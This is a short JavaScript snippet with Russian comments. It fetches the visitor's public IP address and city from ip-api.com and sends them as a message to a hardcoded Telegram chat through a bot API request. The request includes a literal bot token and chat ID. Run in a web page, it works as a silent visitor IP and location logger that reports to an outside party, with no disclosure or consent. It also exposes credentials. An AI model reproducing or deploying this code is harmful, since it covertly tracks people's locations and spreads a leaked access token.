fetch("http://ip-api.com/json")
    .then((response) => response.json())
    .then((data) => {
        console.log(data.city); // Город
        const city = data.city;
        const ip = data.query;
        const message = city + ": " + ip; // Сообщение, которое вы хотите отправить
        const chatId = "6281247312"; // Идентификатор чата (или пользователя), куда вы хотите отправить сообщение
        const token = "5995233822:AAEcIA-IHpUKUqFFCwBjbGBL1QOZJbgPbs0"; // Токен вашего Telegram-бота

        // Формируем API-ссылку для отправки сообщения
        const apiUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
            message
        )}`;

        // Отправка запроса на API-ссылку
        fetch(apiUrl)
            .then((response) => response.json())
            .then((data) => {
                if (data.ok) {
                    console.log("Сообщение успешно отправлено");
                } else {
                    console.error("Ошибка при отправке сообщения");
                }
            })
            .catch(console.error);
    })
    .catch(console.error);
